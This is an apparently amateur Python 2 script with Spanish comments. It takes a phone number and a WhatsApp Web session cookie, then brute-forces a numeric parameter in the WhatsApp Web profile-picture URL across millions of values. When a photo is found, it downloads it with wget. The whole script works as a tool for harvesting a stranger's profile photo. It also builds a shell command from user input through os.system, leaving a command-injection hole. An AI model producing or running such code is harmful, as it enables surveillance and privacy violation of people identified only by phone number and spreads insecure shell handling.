# Librerias
import os
import urllib2

# Preguntar por el telefono
tlfn = raw_input("Tlfn number (Ej: 34123985643):  ")

# cookie
cookie = "" # <--- Aqui va la cookie
cookie = str(cookie) # pasar el valor de la cookie a string por el aque de los numeros

# i original (numero de la segunda variable de la app web de la url)
i = 1410000000
while (i < 1439999999): # loop para recorrer todas las posibiidades del valor i.
	i += 1 # sumale un valor a i cada vez que se repita el loop
	z = "%40" # saneando la url (daba problemas)
	url = "https://web.whatsapp.com/pp?t=l&u=" + str(tlfn) + z + "c.us&i=" + str(i) # url a la que accedera el script ( usamos str para pasar el numero a string)
	print("\n" + tlfn + "\t" + str(i)) # informacion que se muesra en pantalla (tlefono y valor de i en cada intento)
	print(url) # informacion que se muestra en pantalla (url)
	print("\n")
	opener = urllib2.build_opener()
	opener.addheaders.append(("Cookie", "cookiename=" + cookie)) # Asignar Cookie
	f = f = opener.open(url) # urllib establece y descarga la url
	result = f.read() #leemos el contenido de la pagina
	if (result != ""): # si no hay foto, la pagina esta vacia (si no lo esta muestra el mensage encontrado [convendria que ahi parase el sript pero, como? {return Fase?}])
		print("Encontrado!")
	 	os.system("wget " + url) # hacemos que wget descargue la pagina (conviene hacerlo tambien con urllib por el asunto de la cookie)
	else: # si el contenido de la pagina esta en blanco, continua con el siguiente valor de i
	 	continue

print("No se encontro foto de perfil... :(")
